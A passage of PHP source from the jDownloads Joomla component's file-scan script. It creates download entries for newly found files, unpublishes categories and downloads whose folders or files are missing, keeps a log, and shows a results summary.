                                     $thumb_path = JPATH_SITE.'/images/jdownloads/screenshots/thumbnails/';
                                     $screenshot_path = JPATH_SITE.'/images/jdownloads/screenshots/';
                                     $picfilename     = basename($target_path);
                                     $only_name       = File::stripExt($picfilename);
                                     $file_extension  = File::getExt($picfilename);
                                    
                                     $thumbfilename   = $thumb_path.$only_name.'.'.$thumb_file_type;
                                    
                                     $num = 1;
                                     while (File::exists($thumbfilename)){
                                         $picfilename = $only_name.$num.'.'.$thumb_file_type;
                                         $thumbfilename = $thumb_path.$picfilename;
                                         $num++;
                                     }
                                     // create now the new pdf thumbnail
                                     $only_name = File::stripExt($picfilename);
                                       $pdf_thumb_name = jdownloadsHelper::create_new_pdf_thumb($target_path, $only_name, $thumb_path, $screenshot_path);
                                       if ($pdf_thumb_name){
                                           $images = $pdf_thumb_name;
                                       }
                                 }

                                 // create auto thumb when founded file is an image
                                 if ($params->get('create_auto_thumbs_from_pics') && $params->get('create_auto_thumbs_from_pics_by_scan')){
                                     if ($file_is_image = JDownloadsHelper::fileIsPicture($filename)){
                                         // make sure that we have an uniqe filename for the new pic
                                         $thumbpath      = JPATH_SITE.'/images/jdownloads/screenshots/thumbnails/';
                                         $picfilename    = basename($target_path);
                                         $only_name      = File::stripExt($picfilename);
                                         $file_extension = File::getExt($picfilename);
                                        
                                         $thumbfilename = $thumbpath.$picfilename;
                                        
                                         $num = 1;
                                         while (File::exists($thumbfilename)){
                                             $picfilename = $only_name.$num.'.'.$file_extension;
                                             $thumbfilename = $thumbpath.$picfilename;
                                             $num++;
                                         }
                                         // create now the new thumbnail
                                         $thumb_created = jdownloadsHelper::create_new_thumb($target_path, $picfilename);       
                                         if ($thumb_created){
                                             $images = $picfilename;
                                             // create new big image for full view
                                             $image_created = jdownloadsHelper::create_new_image($target_path, $picfilename);
                                         }
                                     }
                                 }

                                 
                                 $sha1_value = sha1_file($target_path);
                                 $md5_value  =  md5_file($target_path);

                                 // build data array
                                 $data = array (
                                    'id' => 0,
                                    'catid' => $id,
                                    'title' => $title,
                                    'alias' => '',
                                    'notes' => $note,
                                    'url_download' => $filename,
                                    'size' => $file_size,
                                    'price' => $price,
                                    'description' => $desc,
                                    'description_long' => $desc,
                                    'changelog' => $desc,
                                    'file_pic' => $file_pic,
                                    'images' => $images,
                                    'created' => $creation_date,
                                    'file_date' => $creation_date,
                                    'sha1_value' => $sha1_value,
                                    'md5_value' => $md5_value,
                                    'published' => (int)$params->get('autopublish_founded_files'),
                                    'access' => $access,
                                    'metadesc' => '',
                                    'metakey' => '',
                                    'created_by' => $creator,
                                    'language' => $language,
                                    'tags' => $tags,
                                    'rules' => array(
                                        'core.create' => array(),
                                        'core.delete' => array(),
                                        'core.edit' => array(),
                                        'core.edit.state' => array(),
                                        'core.edit.own' => array(),
                                        'download' => array(),
                                    ),
                                    'params' => array(),
                                 );

                                 // create new download in table
                                 $create_result = $model_download->createAutoDownload( $data );
                                 if (!$create_result){
                                     // error message
                                     $log_array[] = '<font color="red"><b>Error: Could not add Download for: '.$only_dirs.'/'.$filename.'</b></font><br />';
                                 } else {
                                     $new_downloads_created++;
                                     $log_array[] = '<span style="color:green;">'.Text::_('COM_JDOWNLOADS_AUTO_FILE_CHECK_ADDED').'</span> <b>'.$only_dirs.'/'.$filename.'</b><br />';
                                 }
                             } else {
                                 // add only hint for test run msg
                                 $log_array[] = '<span style="color:green;">'.Text::sprintf('COM_JDOWNLOADS_AUTO_CHECK_NEW_FILE_FOUND', '</span> <b>'.$only_dirs.'/'.$filename.'</b><br />');
                                 $new_file_found = true;                                  
                             }
                         }
                      }
                      $bar->setMessage($title3.' ('.($jd_scan['checked_files'] + $checked_files).')');
                      $bar->increase();
                      $checked_files++;
                      $jd_scan['searched_files'][] = $key3;

                      // check the script duration
                      $current_time = microtime(true);
                      $consumed_time = $current_time - $part_start_time;
                      // If there are only $time_buffer seconds left, start the next pass
                      $remainder = $max_exec_time - (int)round($consumed_time,0);
                      if ($remainder < $time_buffer) {
                          // run next turn
                          $number_of_runs++;
                          $jd_scan['checked_files'] = $jd_scan['checked_files'] + $checked_files;
                          $jd_scan['new_downloads_created'] = $jd_scan['new_downloads_created'] + $new_downloads_created;

                          if ($log_array){
                              foreach ($log_array as $log){
                                $jd_scan['log_array'][] = $log;
                              }
                              $log_array = array();
                          }

                          $jd_scan['number_of_runs'] =  $jd_scan['number_of_runs'] + $number_of_runs;
                          $jd_scan['sum_duration_time'] = $jd_scan['sum_duration_time'] + (int)round($consumed_time,0);
                          $session->set('jd_scan',$jd_scan);

                          $app->redirect(ROUTE::_('scan.php?key='.$secret.'&mode='.$mode.'&test='.$testrun));
                      }
                  }
                  $bar->setMessage($title3);
                  
                  if (!$allFolders && (count($exclude_folders) || count($include_folders))){
                      echo '<small><br />'.Text::_('COM_JDOWNLOADS_BACKEND_AUTOCHECK_SUM_FILES').' '.count($files).' <span class="small label label-inverse">'.Text::_('COM_JDOWNLOADS_BACKEND_AUTOCHECK_NOT_ALL_ITEMS').'</span><br /><br /></small>';
                  } else {
                  echo '<small><br />'.Text::_('COM_JDOWNLOADS_BACKEND_AUTOCHECK_SUM_FILES').' '.count($files).'<br /><br /></small>';
                  }
                  
                  $buffer = ob_get_level();
                  if ($buffer){
                      ob_flush();
                      flush();
                  }

                  $jd_scan['checked_files'] = $jd_scan['checked_files'] + $checked_files;
                  $jd_scan['new_downloads_created'] = $jd_scan['new_downloads_created'] + $new_downloads_created;

                  if ($log_array){
                      foreach ($log_array as $log){
                        $jd_scan['log_array'][] = $log;
                      }
                      $log_array = array();
                  }

                  $jd_scan['mode_2_finished'] = true;
                  $session->set('jd_scan',$jd_scan);

              } else {
                  if ($count_files){
                      for ($z=0; $z < $count_files; $z++){
                          $bar->increase();
                      }
                  } else {
                      $bar->increase();
                  }
                  echo '<small><br />'.Text::_('COM_JDOWNLOADS_BACKEND_AUTOCHECK_SUM_FILES').' '.count($files).'<br /><br /></small>';
                  $buffer = ob_get_level();
                  if ($buffer){
                      ob_flush();
                      flush();
                  }
              }
              echo '</div>';
              unset($files);
              $buffer = ob_get_level();
              if ($buffer){
                  ob_flush();
                  flush();
              }
              if (!$testrun && $params->get('autopublish_reset_use_default_values') == 1){
                  JDownloadsHelper::changeParamSetting('autopublish_use_default_values', '0');
              }
          }

          // ************************************************************************************
          // Mode: 3
          // Exists all published category folders?
          // ************************************************************************************

          if ($mode == 0 || $mode == 3){

              $mis_cats = 0;

              if (!$jd_scan['published_cats']){
                  // get all published categories but not the root
                  $db->setQuery("SELECT * FROM #__jdownloads_categories WHERE published = 1 AND id > 1 ORDER BY id ASC");
                  $cats = $db->loadObjectList();

                  $jd_scan['published_cats'] = $cats;
                  $session->set('jd_scan', $jd_scan);
              } else {
                  $cats = $jd_scan['published_cats'];
              }

              $count_cats = count($cats);

              // create progressbar
              echo '<div>';
              $bar = new ProgressBar();
              $title2 = Text::_('COM_JDOWNLOADS_RUN_MONITORING_INFO4');
              $bar->setMessage($title2);
              $bar->setAutohide(false);
              $bar->setSleepOnFinish(0);
              $bar->setPrecision(100);
              $bar->setForegroundColor('#d9534f');
              $bar->setBarLength(340);
              $bar->initialize($count_cats);

              if (!$jd_scan['mode_3_finished'] && $count_cats > 0){

                  foreach($cats as $cat){

                      if ($cat->id <= $jd_scan['last_checked_cat_nr']){
                          $bar->increase();
                          continue;
                      }

                      //usleep($pause);

                      if ($cat->cat_dir_parent != ''){
                          $cat_dir = $jd_root.$cat->cat_dir_parent.'/'.$cat->cat_dir;
                      } else {
                          $cat_dir = $jd_root.$cat->cat_dir;
                      }

                      // when it not exist, we must unpublish the category
                      if (!Folder::exists($cat_dir)){
                          if (!$testrun){
                              $db->setQuery("UPDATE #__jdownloads_categories SET published = 0 WHERE id = '$cat->id'");
                              $db->execute();
                              $mis_cats++;
                              $log_array[] = '<span style="color:red;">'.Text::_('COM_JDOWNLOADS_AUTO_CAT_CHECK_DISABLED').'</span> <b>'.$cat->cat_dir.'</b><br />';
                          } else {
                              // add only hint for test run msg
                              $log_array[] = '<span style="color:red;">'.Text::sprintf('COM_JDOWNLOADS_AUTO_CHECK_OLD_FOLDER_MISSING', '</span> <b>'.$cat->cat_dir.'</b><br />');
                              $old_folder_missing = true;                                  
                          }
                      }
                      $bar->setMessage($title2.' ('.($jd_scan['checked_cats'] + $checked_cats).')');
                      $bar->increase();
                      $checked_cats++;

                      $jd_scan['last_checked_cat_nr'] = $cat->id;

                      // check the script duration
                      $current_time = microtime(true);
                      $consumed_time = $current_time - $part_start_time;
                      // If there are only $time_buffer seconds left, start the next pass
                      $remainder = $max_exec_time - (int)round($consumed_time,0);
                      if ($remainder < $time_buffer) {
                          // run next turn
                          $number_of_runs++;
                          $jd_scan['checked_cats'] = $jd_scan['checked_cats'] + $checked_cats;
                          $jd_scan['mis_cats'] = $jd_scan['mis_cats'] + $mis_cats;

                          if ($log_array){
                              foreach ($log_array as $log){
                                $jd_scan['log_array'][] = $log;
                              }
                              $log_array = array();
                          }

                          $jd_scan['number_of_runs'] =  $jd_scan['number_of_runs'] + $number_of_runs;
                          $jd_scan['sum_duration_time'] = $jd_scan['sum_duration_time'] + (int)round($consumed_time,0);
                          $session->set('jd_scan',$jd_scan);

                          $app->redirect(ROUTE::_('scan.php?key='.$secret.'&mode='.$mode.'&test='.$testrun));
                      }
                  }
                  $bar->setMessage($title2);
                  echo '<small><br />'.Text::_('COM_JDOWNLOADS_BACKEND_AUTOCHECK_FOLDERS').' '.$count_cats.'<br /><br /></small>';
                  
                  $buffer = ob_get_level();
                  if ($buffer){
                      ob_flush();
                      flush();
                  }

                  $jd_scan['checked_cats'] = $jd_scan['checked_cats'] + $checked_cats;
                  $jd_scan['mis_cats'] = $jd_scan['mis_cats'] + $mis_cats;

                  if ($log_array){
                      foreach ($log_array as $log){
                        $jd_scan['log_array'][] = $log;
                      }
                      $log_array = array();
                  }

                  $jd_scan['mode_3_finished'] = true;
                  $session->set('jd_scan',$jd_scan);
              } else {
                  if ($count_cats){
                      for ($z=0; $z < $count_cats; $z++){
                          $bar->increase();
                      }
                  } else {
                      $bar->increase();
                  }
                  echo '<small><br />'.Text::_('COM_JDOWNLOADS_BACKEND_AUTOCHECK_FOLDERS').' '.$count_cats.'<br /><br /></small>';
                  
                  $buffer = ob_get_level();
                  if ($buffer){
                      ob_flush();
                      flush();
                  }
              }
              
              unset($cats);
          }

          // ************************************************************************************
          // Mode: 4
          // Check whether the assigned Files from published Downloads exists
          // When not found, we change the state to: Unpublished
          // ************************************************************************************

          if ($mode == 0 || $mode == 4){

              $mis_files = 0;

              if (!$jd_scan['published_files']){
                  // get all published Downloads
                  $db->setQuery("SELECT * FROM #__jdownloads_files WHERE published = 1 ORDER BY id ASC");
                  $downloads = $db->loadObjectList();

                  $jd_scan['published_files'] = $downloads;
                  $session->set('jd_scan', $jd_scan);
              } else {
                  $downloads = $jd_scan['published_files'];
              }

              $count_files = count($downloads);

              // create progressbar
              echo '<div>';
              $bar = new ProgressBar();
              $title4 = Text::_('COM_JDOWNLOADS_RUN_MONITORING_INFO6');
              $bar->setMessage($title4);
              $bar->setAutohide(false);
              $bar->setSleepOnFinish(0);
              $bar->setPrecision(100);
              $bar->setForegroundColor('#d9534f');
              $bar->setBarLength(340);
              $bar->initialize($count_files);

              if (!$jd_scan['mode_4_finished'] && $count_files > 0){

                  foreach($downloads as $file){

                      if ($file->id <= $jd_scan['last_checked_file_nr']){
                          $bar->increase();
                          continue;
                      }
                      //usleep($pause);

                      // We can only check Downloads which have a file
                      if ($file->url_download <> ''){
                          $db->setQuery("SELECT cat_dir, cat_dir_parent FROM #__jdownloads_categories WHERE id = '$file->catid'");
                          $cat = $db->loadObject();
                          if ($cat->cat_dir_parent != ''){
                              $cat_dir_path = $cat->cat_dir_parent.'/'.$cat->cat_dir;
                          } else {
                              $cat_dir_path = $cat->cat_dir;
                          }
                          $file_path = $jd_root.$cat_dir_path.'/'.$file->url_download;
                          $cat_dir = $cat->cat_dir.'/'.$file->url_download;

                          if (!file_exists($file_path)){
                              if (!$testrun){
                                  $db->setQuery("UPDATE #__jdownloads_files SET published = 0 WHERE id = '$file->id'");
                                  $db->execute();
                                  $mis_files++;
                                  $log_array[] = '<span style="color:red;">'.Text::_('COM_JDOWNLOADS_AUTO_FILE_CHECK_DISABLED').'</span> <b>'.$cat_dir.'</b></font><br />';
                              } else {
                                  // add only hint for test run msg
                                  $log_array[] = '<span style="color:red;">'.Text::sprintf('COM_JDOWNLOADS_AUTO_CHECK_OLD_FILE_MISSING', '</span> <b>'.$cat_dir.'</b><br />');
                                  $old_file_missing = true;                                  
                              }
                          }
                      }
                      $bar->setMessage($title4.' ('.($jd_scan['checked_downloads'] + $checked_downloads).')');
                      $bar->increase();
                      $checked_downloads++;

                      $jd_scan['last_checked_file_nr'] = $file->id;

                      // check the script duration
                      $current_time = microtime(true);
                      $consumed_time = $current_time - $part_start_time;
                      // If there are only $time_buffer seconds left, start the next pass
                      $remainder = $max_exec_time - (int)round($consumed_time,0);
                      if ($remainder < $time_buffer) {
                          // run next turn
                          $number_of_runs++;
                          $jd_scan['checked_downloads'] = $jd_scan['checked_downloads'] + $checked_downloads;
                          $jd_scan['mis_files'] = $jd_scan['mis_files'] + $mis_files;

                          if ($log_array){
                              foreach ($log_array as $log){
                                $jd_scan['log_array'][] = $log;
                              }
                              $log_array = array();
                          }

                          $jd_scan['number_of_runs'] =  $jd_scan['number_of_runs'] + $number_of_runs;
                          $jd_scan['sum_duration_time'] = $jd_scan['sum_duration_time'] + (int)round($consumed_time,0);
                          $session->set('jd_scan',$jd_scan);

                          $app->redirect(ROUTE::_('scan.php?key='.$secret.'&mode='.$mode.'&test='.$testrun));
                      }
                  }
                  $bar->setMessage($title4);
                  echo '<small><br />'.Text::_('COM_JDOWNLOADS_BACKEND_AUTOCHECK_DOWNLOADS').' '.count($downloads).'<br /></small>';
                  
                  $buffer = ob_get_level();
                  if ($buffer){
                      ob_flush();
                      flush();
                  }

                  $jd_scan['checked_downloads'] = $jd_scan['checked_downloads'] + $checked_downloads;
                  $jd_scan['mis_files'] = $jd_scan['mis_files'] + $mis_files;

                  if ($log_array){
                      foreach ($log_array as $log){
                        $jd_scan['log_array'][] = $log;
                      }
                      $log_array = array();
                  }

                  $jd_scan['mode_4_finished'] = true;
                  $session->set('jd_scan',$jd_scan);
              } else {
                  if ($count_files){
                      for ($z=0; $z < $count_files; $z++){
                          $bar->increase();
                      }
                  } else {
                      $bar->increase();
                  }
                  echo '<small><br />'.Text::_('COM_JDOWNLOADS_BACKEND_AUTOCHECK_DOWNLOADS').' '.count($downloads).'<br /></small>';
                  
                  $buffer = ob_get_level();
                  if ($buffer){
                      ob_flush();
                      flush();
                  }
              }
          }
          
          $buffer = ob_get_level();
          if ($buffer){
              ob_flush();
              flush();
          }
          
          echo '</div>';

          // ************************************************************************************
          // Final part
          // ************************************************************************************

          // Build log message
          if (count($jd_scan['log_array']) > 0){
              $date = date(Text::_('DATE_FORMAT_LC2')).':<br />';
              if ($testrun){
                  $date .= Text::_('COM_JDOWNLOADS_AUTO_CHECK_TEST_RUN_HINT').'<br />';    
              }
              array_unshift($jd_scan['log_array'], $date);

              foreach ($jd_scan['log_array'] as $log) {
                  $log_message .= $log;
              }
          }

          // When we have changed anything, we store it in the log file at the top position
          if ($log_message != ''){
              // Save it only in file when not deactivated
              if ($jd_scan['log_save']){
                  if (File::exists($log_file)){
                      // Check at first the currently filesize
                      $size = (int)filesize($log_file);
                      if (($size / 1024) >= $params->get('max_size_log_file')){
                          @unlink($log_file);
                          $x = file_put_contents($log_file, $log_message, FILE_APPEND | LOCK_EX);
                      } else {
                          $content = file_get_contents($log_file);
                          $new_content = $log_message.'<br />'.$content;
                          $x = file_put_contents( $log_file, $new_content, LOCK_EX );
                      }
                  } else {
                      $x = file_put_contents($log_file, $log_message, FILE_APPEND | LOCK_EX);
                  }
              }
          }

          // Use the bootstrap cards to list the results 
          echo '<div class="card my-3">';
            echo '<div class="card-header"><strong>'.Text::_('COM_JDOWNLOADS_BACKEND_AUTOCHECK_TITLE').'</strong></div>';
          
          if ($mode == 0 || $mode == 1){
              if ($jd_scan['new_cats_created'] > 0){
                  echo '<p class="text-primary m-2">'.$jd_scan['new_cats_created'].' '.Text::_('COM_JDOWNLOADS_BACKEND_AUTOCHECK_NEW_CATS').'</p>';
              } else {
                  if (!$testrun || empty($log)){
                      echo '<p class="text-success m-2">'.Text::_('COM_JDOWNLOADS_BACKEND_AUTOCHECK_NO_NEW_CATS').'</p>';
                  }    
              }
          }

          if ($mode == 0 || $mode == 2){
              if ($jd_scan['new_downloads_created'] > 0){
                  echo '<p class="text-primary m-2">'.$jd_scan['new_downloads_created'].' '.Text::_('COM_JDOWNLOADS_BACKEND_AUTOCHECK_NEW_FILES').'</p>';
              } else {
                  if (!$testrun || empty($log)){
                      echo '<p class="text-success m-2">'.Text::_('COM_JDOWNLOADS_BACKEND_AUTOCHECK_NO_NEW_FILES').'</p>';
                  }
              }
          }

          if ($mode == 0 || $mode == 3){
              if ($jd_scan['mis_cats'] > 0){
                  echo '<p class="text-danger m-2">'.$jd_scan['mis_cats'].' '.Text::_('COM_JDOWNLOADS_BACKEND_AUTOCHECK_MISSING_CATS').'</p>';
              } else {
                  if (!$testrun || empty($log)){
                      echo '<p class="text-success m-2">'.Text::_('COM_JDOWNLOADS_BACKEND_AUTOCHECK_NO_MISSING_CATS').'</p>';
                  }
              }
          }

          if ($mode == 0 || $mode == 4){
              if ($jd_scan['mis_files'] > 0){
                  echo '<p class="text-danger m-2">'.$jd_scan['mis_files'].' '.Text::_('COM_JDOWNLOADS_BACKEND_AUTOCHECK_MISSING_FILES').'</p>';
              } else {
                  if (!$testrun || empty($log)){
                      echo '<p class="text-success m-2">'.Text::_('COM_JDOWNLOADS_BACKEND_AUTOCHECK_NO_MISSING_FILES').'</p>';
                  }
              }
          }

          // View results in detail
          if ($log_message){
              echo '<div class="small">';
              if ($old_file_missing || $old_folder_missing){
                  echo '<p><span class="label label-important">'.Text::_('COM_JDOWNLOADS_BACKEND_AUTOCHECK_PROBLEM_FOUND_MSG').'</span></p>';     
              }

              echo '<div class="card-body pt-1" style="height: 150px; overflow-y: auto">
                        <div class="scrollable overflow-auto"><div class="" style="font-size:10px; font-family:Verdana; line-height:15px;"><strong>'.Text::_('COM_JDOWNLOADS_BACKEND_AUTOCHECK_LOG_TITLE').'</strong><br />'.$log_message.'</div>  
                   </div>';
          }

          echo '</div>'; // end message          
          
          if (!$testrun || empty($log)){
              echo '<div class="d-grid"><input type="button" class="btn btn-success btn-block btn-sm"  style="max-width:350px;" value="'.Text::_('COM_JDOWNLOADS_RUN_MONITORING_INFO7').'" onclick="windowClose();"></div>';
          } else {
              echo '<div class="card-footer">
                        <p class="">'.Text::_('COM_JDOWNLOADS_AUTO_CHECK_FINISH_INFO_TEST').'</p>
                    </div>';
          }
          
          echo '</div>'; // end card
          
          if ($testrun && $log_message){
              // create a link to add the possiblility to make the changes really
              $link = '<div class="d-grid"><a href="scan.php?key='.$secret.'&mode='.$mode.'&test=0" class="btn btn-danger btn-sm" role="button">'.Text::_('COM_JDOWNLOADS_AUTOCHECK_MAKE_CHANGES_PERMANENTLY').'</a></div>';
              echo $link;
              
              echo '</div>';

          }
          
          if ($params->get('view_debug_info')){
              $debug_info = '<p>'.Text::_('COM_JDOWNLOADS_AUTOCHECK_NUMBER_OF_STARST_LABEL').$jd_scan['number_of_runs'];
              $debug_info .= '<br /> max_execution_time: '.(int)ini_get('max_execution_time');
              $debug_info .= '<br /> memory_limit: '.(int)ini_get('memory_limit').'</p>';
              echo '<div class="pt-2">'.$debug_info.'</div>';
          }
          
          $buffer = ob_get_level();
          if ($buffer){
              ob_flush();
              flush();
          }                                                                                          

    } else {
          // error upload dir not exists
          echo '<div class="alert alert-error"><b>'.Text::sprintf('COM_JDOWNLOADS_AUTOCHECK_DIR_NOT_EXIST', $params->get('files_uploaddir')).'</b><br />'.Text::_('COM_JDOWNLOADS_AUTOCHECK_DIR_NOT_EXIST_2').'</div>';
    }
    echo '</div>'; 
}

/*
 * Simple function to replicate PHP 5 behaviour
 */
function microtime_float(){
    list($usec, $sec) = explode(" ", microtime());
    return ((float)$usec + (float)$sec);
}

function remove_server_limits() {
    // max_execution_time is 5 hours
    if (!ini_get('safe_mode')) {
        $a = set_time_limit(0);
        
        $mem_limit = @ini_get('memory_limit');
        if ((int)$mem_limit < 512){
            $a = ini_set('memory_limit', '1024M');
        }
        
        $b = ini_set('memory_limit', '1024M');
        $c = ini_set('max_execution_time', 18000);
        return true;
    }
    return false;
}

?>
